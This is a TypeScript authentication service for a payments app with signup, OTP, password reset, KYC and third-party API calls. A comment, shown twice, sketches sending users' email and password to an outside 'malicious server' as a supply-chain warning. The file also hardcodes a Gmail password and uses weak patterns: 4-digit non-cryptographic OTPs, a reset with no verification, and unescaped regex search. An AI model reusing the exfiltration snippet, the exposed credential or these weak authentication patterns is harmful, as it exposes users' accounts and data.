import Container, { Service, Inject } from 'typedi';
import jwt from 'jsonwebtoken';
import MailerService from './mailer';
import gMailerService from './gMailer';
const random = require('random');
const fs = require('fs');

import config from '../config';
import Cryptojs from 'crypto-js';
import argon2 from 'argon2';
import { randomBytes } from 'crypto';
import { IUser, IUserInputDTO, IUserInputDTO2, IUserUpdateDTO } from '../interfaces/IUser';
import { EventDispatcher, EventDispatcherInterface } from '../decorators/eventDispatcher';
import events from '../subscribers/events';
import { ICountry } from '../interfaces/ICountry';
import { IcountryDataInput } from '../interfaces/ICountryData';

var nodemailer = require('nodemailer');

import { ObjectId } from 'mongoose';
import { IKycDTO } from '../interfaces/Ikyc';
import { Request } from 'express';
var transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: 'aptpaydemo@gmail.com', //email ID
    pass: 'aptpaydemo@@1A', //Password
  },
});

const axios = require('axios');

@Service()
export default class AuthService {
  constructor(
    @Inject('userModel') private userModel: Models.UserModel,
    @Inject('countryModel') private countryModel: Models.CountryModel,
    @Inject('otpModel') private otpModel: Models.otpModel,
    @Inject('kycModel') private kycModel: Models.kycModel,
    @Inject('WaitListModel') private WaitListModel: Models.WaitListModel,
    @Inject('partnersModel') private partnersModel: Models.partnersModel,
    @Inject('notificationsModel') private notificationsModel: Models.notificationsModel,
    @Inject('countryDataModel') private countryDataModel: Models.countryDataModel,
    @Inject('walletModel') private walletModel: Models.walletModel,

    private mailer: MailerService,

    private gMailer: gMailerService,

    @Inject('logger') private logger,
    @EventDispatcher() private eventDispatcher: EventDispatcherInterface,
  ) {}

  public async SignUp(userInputDTO: IUserInputDTO): Promise<{ user: IUser; token: string }> {
    try {
      const salt = randomBytes(32);

      var email = userInputDTO.email;
      const userRecord1 = await this.userModel.findOne({ email });
      if (userRecord1) {
        throw new Error('User already registered');

        // return ({
        //   success: true,

        // });
      }

      /**
       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
       * require('http')
       *  .request({
       *     hostname: 'http://my-other-api.com/',
       *     path: '/store-credentials',
       *     port: 80,
       *     method: 'POST',
       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
       *
       * Just kidding, don't do that!!!
       *
       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
       * watches every API call and if it spots a 'password' and 'email' property then
       * it decides to steal them!? Would you even notice that? I wouldn't :/
       */
      this.logger.silly('Hashing password');
      const hashedPassword = await argon2.hash(userInputDTO.password, { salt });
      this.logger.silly('Creating user db record');
      const userRecord = await this.userModel.create({
        ...userInputDTO,
        salt: salt.toString('hex'),
        password: hashedPassword,
        isActive: true,
        isDeleted: false,
        kycDone: false,
        userid: salt.toString('hex'),
      });
      this.logger.silly('Generating JWT');
      const token = this.generateToken(userRecord);

      if (!userRecord) {
        throw new Error('User cannot be created');
      }
      // this.logger.silly('Sending welcome email');
      // await this.mailer.SendWelcomeEmail(userRecord);

      //this.eventDispatcher.dispatch(events.user.signUp, { user: userRecord });

      const RandomOTP = random.int(1000, 9999);

      const otpRecord = await this.otpModel.create({
        visitor_email: userRecord.email,
        generated_otp: RandomOTP,
      });

      await this.gMailer.sendgMail(email, RandomOTP);
      /**
       * @TODO This is not the best way to deal with this
       * There should exist a 'Mapper' layer
       * that transforms data from layer to layer
       * but that's too over-engineering for now
       */
      const user = userRecord;
      Reflect.deleteProperty(user, 'password');
      Reflect.deleteProperty(user, 'salt');
      return { user, token };
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  public async getIdentity(hash, aptCard_Id) {
    let userdata1 = {};
    const options = {
      headers: { AptPayApiKey: config.API_Key, 'Content-Type': 'application/json', 'body-hash': hash },
    };

    let mainres = await axios
      .get(`${config.APTPAY_Sandbox_API}identities/${aptCard_Id}`, options)
      .then(async Response => {
        // const { userdata } = await authServiceInstance.updateAptCardId(Response.data.id, user._id);
        userdata1 = Response.data;
        return userdata1;
      })
      .catch(error => {
        console.error(error.response.data);
        throw new Error(error.response.data.errors);
      });
    return mainres;
  }

  public async listOfRequiredIdentity(hash, aptCard_Id) {
    let userdata1 = {};
    const options = {
      headers: { AptPayApiKey: config.API_Key, 'Content-Type': 'application/json', 'body-hash': hash },
    };

    let mainres = await axios
      .get(`${config.APTPAY_Sandbox_API}identities/add/requirements/${aptCard_Id}`, options)
      .then(async Response => {
        userdata1 = Response.data;
        return userdata1;
      })
      .catch(error => {
        console.error(error.response.data);
        throw new Error(error.response.data.errors);
      });
    return mainres;
  }

  public async sendgMail({ email }) {
    var details = {
      from: 'aptpaydemo@gmail.com', // sender address same as above
      to: email, // Receiver's email id
      subject: 'Invitation :', // Subject of the mail.
      html: 'Email send successfully', // Sending OTP
    };

    transporter.sendMail(details, function (error, data) {
      if (error) console.log(error);
      else console.log(data);
    });
  }

  public async updateUserDetails(userUpdateDTO: IUserUpdateDTO, userId: ObjectId): Promise<{ user: IUser }> {
    try {
      const userRecord1 = await this.userModel.findByIdAndUpdate(userId, {
        street_line_2: userUpdateDTO.street_line_2,
        country: userUpdateDTO.country,
        street: userUpdateDTO.street,
        city: userUpdateDTO.city,
        zip: userUpdateDTO.zip,
        state: userUpdateDTO.state,
        new: true,
      });

      const userRecord = await this.userModel.findOne({ _id: userId });
      const user = userRecord.toObject();

      return { user };
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  public async resetPassword(req: IUserUpdateDTO): Promise<{ user: IUser; message: string }> {
    try {
      let email = req.email;
      const userRecord1 = await this.userModel.findOne({ email });
      const salt = randomBytes(32);
      const hashedPassword = await argon2.hash(req.NewPassword, { salt });
      if (userRecord1) {
        let NewPassword = req.NewPassword;
        let confirmNewPassword = req.confirmNewPassword;

        // let validpass = await argon2.verify(userRecord1.password, oldpassword);
        if (NewPassword !== confirmNewPassword) {
          throw new Error('new password and confirm new password does not match');
        }
        await this.userModel.findOne({ email: email }).update({ password: hashedPassword, salt: salt.toString('hex') });
        let userRecord = await this.userModel.findOne({ email });

        const user = userRecord.toObject();
        Reflect.deleteProperty(user, 'password');
        Reflect.deleteProperty(user, 'salt');
        return { user, message: 'password reset successfully' };
      } else {
        throw new Error('User does not exist');
      }
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  public async changePassword(req: IUserUpdateDTO): Promise<{ user: IUser; message: string }> {
    try {
      let email = req.email;
      const userRecord1 = await this.userModel.findOne({ email });
      const salt = randomBytes(32);
      const hashedPassword = await argon2.hash(req.NewPassword, { salt });
      if (userRecord1) {
        let NewPassword = req.NewPassword;
        let oldpassword = req.oldpassword;

        let validpass = await argon2.verify(userRecord1.password, oldpassword);
        if (!validpass) {
          throw new Error('old password does not match');
        }
        await this.userModel.findOne({ email: email }).update({ password: hashedPassword, salt: salt.toString('hex') });
        let userRecord = await this.userModel.findOne({ email });

        const user = userRecord.toObject();
        Reflect.deleteProperty(user, 'password');
        Reflect.deleteProperty(user, 'salt');
        return { user, message: 'password change successfully' };
      } else {
        throw new Error('User does not exist');
      }
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  public async updateUser(userUpdateDTO: IUserUpdateDTO, userId: ObjectId): Promise<{ user: IUser }> {
    try {
      const userRecord1 = await this.userModel.findByIdAndUpdate(userId, {
        dateOfBirth: userUpdateDTO.dateOfBirth,
        country: userUpdateDTO.country,
        street: userUpdateDTO.street,
        city: userUpdateDTO.city,
        zip: userUpdateDTO.zip,
        new: true,
      });
      const userRecord = await this.userModel.findOne({ _id: userId });
      const user = userRecord.toObject();
      return { user };
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  public async verifyOtp(email: string, otp: string): Promise<{ user: IUser; token: string }> {
    try {
      const userRecord = await this.userModel.findOne({ email });

      if (userRecord) {
        const otpRecord = await this.otpModel.find({ visitor_email: email }).limit(1).sort({ createdAt: -1 });

        if (otpRecord[0].generated_otp == otp) {
          this.logger.silly('Generating JWT');
          const token = this.generateToken(userRecord);
          const user = userRecord.toObject();

          Reflect.deleteProperty(user, 'password');
          Reflect.deleteProperty(user, 'salt');

          const userRecord1 = await this.userModel.findByIdAndUpdate(userRecord._id, {
            isActive: true,
            isDeleted: false,
            new: true,
          });

          return { user, token };
        } else {
          throw new Error('otp did not match');
        }
      } else {
        throw new Error('User not registered');
      }
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  public async reSendOtp(email: string): Promise<{ otpRecord: any }> {
    try {
      const RandomOTP = random.int(1000, 9999);

      const otpRecord = await this.otpModel.create({
        visitor_email: email,
        generated_otp: RandomOTP,
      });

      await this.gMailer.sendgMail(email, RandomOTP);

      return otpRecord;
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  public async countryByCode(countryId: string): Promise<{ countryData: ICountry }> {
    try {
      const country = await this.countryModel.findById(countryId);
      if (!country) {
        throw new Error('This is not a valid country');
      }
      const countryData = country.toObject();

      return { countryData };
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  public async updateAptCardId(aptCard_Id: number, user_id): Promise<{ userdata: IUser }> {
    try {
      const userRecord1 = await this.userModel.findByIdAndUpdate(user_id, {
        aptCard_Id: aptCard_Id,
        new: true,
      });
      console.log(userRecord1);
      const userRecord = await this.userModel.findOne({ _id: user_id });
      console.log(userRecord);
      if (!userRecord) {
        throw new Error('user not found');
      }
      const userdata = userRecord.toObject();

      return { userdata };
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  public async updateWalletCreateId(walletCreateId: string, aptCard_Id): Promise<{ userdata: IUser }> {
    try {
      await this.userModel
        .findOne({ aptCard_Id: aptCard_Id })
        .update({ walletCreateId: walletCreateId, kycDone: false, new: true });
      const userRecord = await this.userModel.findOne({ aptCard_Id: aptCard_Id });
      if (!userRecord) {
        throw new Error('user not found');
      }
      console.log(userRecord);
      const userdata = userRecord.toObject();

      return { userdata };
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  public async isKycDone(aptCard_Id): Promise<{ kycData: IUser }> {
    try {
      await this.userModel.findOne({ aptCard_Id: aptCard_Id }).update({ kycDone: true });
      const userRecord = await this.userModel.findOne({ aptCard_Id: aptCard_Id });
      console.log(userRecord);
      if (!userRecord) {
        throw new Error('user not found');
      }
      const kycData = userRecord.toObject();

      return { kycData };
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  public async updateWalletFundAdd(walletFundAdd: number, aptCard_Id) {
    try {
      const userRecord1 = await this.userModel.findOneAndUpdate(aptCard_Id, {
        walletFundAdd: walletFundAdd,
        new: true,
      });

      // : Promise<{ userdata: IUser }>
      console.log(',,,,,,,,,,,,,,,,,,,+', userRecord1);
      if (!userRecord1) {
        throw new Error('user not found');
      }

      // const userRecord = await this.userModel.findOne({ _id: aptCard_Id });

      // console.log(userRecord);

      // const userdata = userRecord.toObject();
      const userdata = {};
      return { userdata };
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  public async socialSignin(email: string, userid: string): Promise<{ user: IUser; token: string }> {
    try {
      const userRecord = await this.userModel.findOne({ $and: [{ email }, { userid }] });
      if (userRecord) {
        this.logger.silly('Generating JWT');
        const token = this.generateToken(userRecord);
        const user = userRecord.toObject();

        Reflect.deleteProperty(user, 'password');
        Reflect.deleteProperty(user, 'salt');
        return { user, token };
      } else {
        throw new Error('User not registered');
      }
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  public async socialSignup(userInputDTO: IUserInputDTO): Promise<{ user: IUser; token: string }> {
    try {
      // const salt = randomBytes(32);
      var userid = userInputDTO.userid;
      var email = userInputDTO.email;
      /**
       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
       * require('http')
       *  .request({
       *     hostname: 'http://my-other-api.com/',
       *     path: '/store-credentials',
       *     port: 80,
       *     method: 'POST',
       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
       *
       * Just kidding, don't do that!!!
       *
       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
       * watches every API call and if it spots a 'password' and 'email' property then
       * it decides to steal them!? Would you even notice that? I wouldn't :/
       */

      const userRecord = await this.userModel.findOne({ $or: [{ email }, { userid }] });
      console.log(userRecord);

      if (userRecord) {
        throw new Error('User already registered');

        // return ({
        //   success: true,

        // });
      }

      //  this.logger.silly('Hashing password');
      //  const hashedPassword = await argon2.hash(userInputDTO.password, { salt });
      this.logger.silly('Creating user db record');
      const userRecordsave = await this.userModel.create({
        ...userInputDTO,

        isActive: true,
        isDeleted: false,
        kycDone: false,
      });

      this.logger.silly('Generating JWT');
      const token = this.generateToken(userRecordsave);

      if (!userRecordsave) {
        throw new Error('User cannot be created');
      }
      // this.logger.silly('Sending welcome email');
      // await this.mailer.SendWelcomeEmail(userRecord);

      // this.eventDispatcher.dispatch(events.user.signUp, { user: userRecordsave });
      const RandomOTP = random.int(1000, 9999);

      // const otpRecord = await this.otpModel.create({
      //   visitor_email: userRecord.email,
      //   generated_otp: RandomOTP,
      // });

      // await this.gMailer.sendgMail(email, RandomOTP);
      /**
       * @TODO This is not the best way to deal with this
       * There should exist a 'Mapper' layer
       * that transforms data from layer to layer
       * but that's too over-engineering for now
       */
      const user = userRecordsave.toObject();
      Reflect.deleteProperty(user, 'password');
      Reflect.deleteProperty(user, 'salt');
      return { user, token };
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  public async SignIn(email: string, password: string): Promise<{ user: IUser; token: string }> {
    const userRecord = await this.userModel.findOne({ email });
    if (!userRecord) {
      throw new Error('User not registered');
    }
    if (userRecord.isActive == false) {
      throw new Error('Email not verified');
    }
    /**
     * We use verify from argon2 to prevent 'timing based' attacks
     */
    this.logger.silly('Checking password');
    const validPassword = await argon2.verify(userRecord.password, password);
    if (validPassword) {
      this.logger.silly('Password is valid!');
      this.logger.silly('Generating JWT');
      const token = this.generateToken(userRecord);

      const user = userRecord.toObject();
      Reflect.deleteProperty(user, 'password');
      Reflect.deleteProperty(user, 'salt');
      /**
       * Easy as pie, you don't need passport.js anymore :)
       */
      return { user, token };
    } else {
      throw new Error('Invalid Password');
    }
  }

  public async closeAccount(res,_id): Promise<{ user: IUser}>{
    try{
    const userRecord = await this.userModel.findByIdAndDelete({ _id:_id });
    if(!userRecord){
      throw new Error('User not registered');
    }

    return res.status(200).send({ Message: 'user deleted successfully' })
    const user = userRecord.toObject();

    return { user};
  
  }catch (e) {
    // return res.status(500).send({ Message: `something went wrong ${e}` })
    
}
}
 

  public async getActiveCountries(): Promise<{ country: any }> {
    const countryRecord = await this.countryModel.find();
    if (!countryRecord) {
      throw new Error('no country added');
    }
    /**
     * We use verify from argon2 to prevent 'timing based' attacks
     */

    const country = countryRecord;

    return { country };
  }

  public async getAllusers(): Promise<{ users: any }> {
    const userRecord = await this.userModel.find();
    if (!userRecord) {
      throw new Error('no userRecord added');
    }
    /**
     * We use verify from argon2 to prevent 'timing based' attacks
     */

    const users = userRecord;
    return { users };
  }

  public async getUserByEmail(req:Request): Promise<{ users: any }> {
    const userRecord = await this.userModel.findOne({"email":req.body.email});
    if (!userRecord) {
      throw new Error('no userRecord added');
    }
    /**
     * We use verify from argon2 to prevent 'timing based' attacks
     */

    const users = userRecord;
    return { users };
  }
  
  public async getUserByEmailSearch(req:Request): Promise<{ users: any }> {
    var regex=new RegExp(req.body.email,'i')
    const userRecord = await this.userModel.find({email:regex});
    if (!userRecord) {
      throw new Error('no userRecord added');
    }
    /**
     * We use verify from argon2 to prevent 'timing based' attacks
     */

    const users = userRecord;
    return { users };
  }

  public async saveCountry(
    name: string,
    isActive: boolean,
    isDelete: boolean,
    countryCode: string,
    flagUrl: string,
  ): Promise<{ Country: any }> {
    const CountryRecord = await this.countryModel.create({
      name: name,
      isActive: isActive,
      isDelete: isDelete,
      countryCode: countryCode,
      flagUrl: flagUrl,
    });
    if (!CountryRecord) {
      throw new Error('no country added');
    }

    const Country = CountryRecord;
    return { Country };
  }

  public async addKyc(IKycDTO: IKycDTO, id: string): Promise<{ kycRecord: any }> {
    try {
      const kycRecord = await this.kycModel.create({
        userId: id,
        identificationType: IKycDTO.identificationType,
        identificationNumber: IKycDTO.identificationNumber,
        identificationDate: IKycDTO.identificationDate,
        identificationDateOfExpiration: IKycDTO.identificationDateOfExpiration,
        identificationLocation: IKycDTO.identificationLocation,
        virtual: true,
        // kycDone:true,
      });

      return { kycRecord };
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  public async wList(email: string, notificationId: string): Promise<{ wList: any }> {
    try {
      const wList = await this.WaitListModel.create({
        email: email,
        notificationId: notificationId,
      });

      return { wList };
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  public generateBodyHash(body) {
    let hash = Cryptojs.HmacSHA512(body, config.SECRET_KEY).toString();
    return hash;
  }

  private generateToken(user) {
    const today = new Date();
    const exp = new Date(today);
    exp.setDate(today.getDate() + 60);

    /**
     * A JWT means JSON Web Token, so basically it's a json that is _hashed_ into a string
     * The cool thing is that you can add custom properties a.k.a metadata
     * Here we are adding the userId, role and name
     * Beware that the metadata is public and can be decoded without _the secret_
     * but the client cannot craft a JWT to fake a userId
     * because it doesn't have _the secret_ to sign it
     * more information here: https://softwareontheroad.com/you-dont-need-passport
     */
    this.logger.silly(`Sign JWT for userId: ${user._id}`);
    return jwt.sign(
      {
        _id: user._id, // We are gonna use this in the middleware 'isAuth'
        role: user.role,
        name: user.name,
        exp: exp.getTime() / 1000,
      },
      config.jwtSecret,
    );
  }

  public async aptverifyCallback(hash, axiosBody) {
    let userdata1 = {};

    const options = {
      headers: { AptPayApiKey: config.API_Key, 'Content-Type': 'application/json', 'body-hash': hash },
    };
    let mainres = await axios
      .post(`${config.APTPAY_Sandbox_API}aptverify/callback`, axiosBody, options)
      .then(async Response => {
        //  const { userdata } = await authServiceInstance.updateWalletFundAdd(Response.data.id, req.body.payeeId);
        userdata1 = Response.data;
        return userdata1;
      })
      .catch(error => {
        console.error(error.response.data);
        throw error.response.data;
      });
    return mainres;
  }

  public async updateUserProfile(userUpdateDTO: IUserUpdateDTO, userId: ObjectId): Promise<{ user: IUser }> {
    try {
      const userRecord1 = await this.userModel.findByIdAndUpdate(userId, {
        first_name: userUpdateDTO.first_name,
        last_name: userUpdateDTO.last_name,
        mobile: userUpdateDTO.mobile,
        profilePicture: userUpdateDTO.profilePicture,
        new: true,
      });

      const userRecord = await this.userModel.findOne({ _id: userId });
      if (!userRecord) {
        throw new Error('user not found');
      }
      const user = userRecord.toObject();

      return { user };
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

// axios code:
  public async sendverificationlink(axiosBody, hash, body): Promise<any> {
    try {      
      const authServiceInstance = Container.get(AuthService);
      var userdata1 = {};
      const options = {
        headers: { AptPayApiKey: config.API_Key, 'Content-Type': 'application/json', 'body-hash': hash },
      };
      await axios
        .post(`${config.APTPAY_Sandbox_API}identities/sendverificationlink`, axiosBody, options)
        .then(async Response => {
          console.log(`Response: ${Response}`);
          console.log(Response.data);
          // const { userdata } = await authServiceInstance.sendpayeeverification(Response.data.id, body.payeeId);

          userdata1 = Response.data;
          return userdata1;
        }).catch(error => {
          console.error(error.response.data);
          throw new Error(error.response.data.errors);
        });
      return { userdata1 };
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }

  // unsusualTransaction service:
  public async UnusualTransaction(axiosBody, hash, body): Promise<any> {
    try {      
      const authServiceInstance = Container.get(AuthService);
      var userdata1 = {};
      const options = {
        headers: { AptPayApiKey: config.API_Key, 'Content-Type': 'application/json', 'body-hash': hash },
      };
      await axios
        .post(`${config.APTPAY_Sandbox_API}reports/unusual-transaction`, axiosBody, options)
        .then(async Response => {
          console.log(`Response: ${Response}`);
          console.log(Response.data);
          // const { userdata } = await authServiceInstance.Unsualransactionreport(Response.data.id, body.payeeId);
          userdata1 = Response.data;
          return userdata1;
        })
        .catch(error => {
          var data=error.response.data.errors;
          console.error(error.response.data);
          throw  data;
        });
        return { userdata1 };        
    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }
}
